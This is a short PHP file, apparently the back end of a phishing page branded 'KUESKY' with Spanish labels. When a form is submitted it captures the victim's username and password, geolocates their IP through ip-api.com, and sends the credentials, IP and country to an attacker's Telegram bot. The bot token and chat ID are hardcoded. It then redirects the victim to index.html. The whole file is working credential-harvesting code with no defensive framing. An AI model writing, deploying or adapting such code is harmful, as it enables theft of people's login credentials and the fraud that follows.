<?php
session_start();

$token = '8045768923:AAFlqaUVW4IFjfLxJROAveSwoCalwANjB-8';
$chat_id = "7655000874";
$website = "https://api.telegram.org/bot$token";

if (isset($_POST["username"]) && isset($_POST["password"])) {
    $usuario = $_POST["username"];
    $cpass = $_POST["password"];
    $_SESSION["usuario"] = $usuario; // ← Guardamos el usuario para el resto del flujo

    $ip = $_SERVER["REMOTE_ADDR"];
    $ch = curl_init("http://ip-api.com/json/$ip");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $ip_data = json_decode(curl_exec($ch), true);
    curl_close($ch);

    $country = $ip_data["country"] ?? "Desconocido";
    $ip = $ip_data["query"] ?? $ip;

    $msg = "KUESKY 📲\n📧 Usuario: $usuario\n🔑 Clave: $cpass\n=============================\n📍 País: $country\n📍 IP: $ip\n==========================\n";
    $url = "$website/sendMessage?chat_id=$chat_id&parse_mode=HTML&text=" . urlencode($msg);
    file_get_contents($url);

    // Redirección
    header("Location: index.html");
    exit;
}
?>